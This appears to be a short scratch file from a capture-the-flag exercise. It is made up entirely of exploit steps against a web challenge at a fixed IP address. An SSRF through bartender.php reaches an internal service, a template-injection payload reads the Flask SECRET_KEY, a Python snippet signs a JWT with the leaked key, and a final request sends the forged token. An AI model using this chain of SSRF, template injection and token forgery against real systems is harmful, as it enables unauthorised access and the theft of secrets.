'''
http://154.57.164.75:39361/bartender.php?url=http://127.0.0.1:5000/?x=%7Blogify.__globals__%5Bapp%5D.config%5BSECRET_KEY%5D%7D&name=a&secret=b&url=http://example.com/
'''

'''
http://154.57.164.75:39361/bartender.php?url=http://127.0.0.1:5000/logs&name=a&secret=b&url=http://example.com/
'''

import jwt
secret = "b14acf71a4740e213dccb1600e0f2222b2cb6f0228cf430f501b64ac64949257"
payload = {"username": "x", "is_admin": False}
print(jwt.encode(payload, secret, algorithm="HS256"))


'''
http://154.57.164.75:39361/bartender.php?url=http://127.0.0.1:5000/bartender?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IngiLCJpc19hZG1pbiI6ZmFsc2V9.buQKt9mxuYIno3pbHLzp2F1bc1pONDaZlCrsfwb4zyQ&url=http://example.com/
'''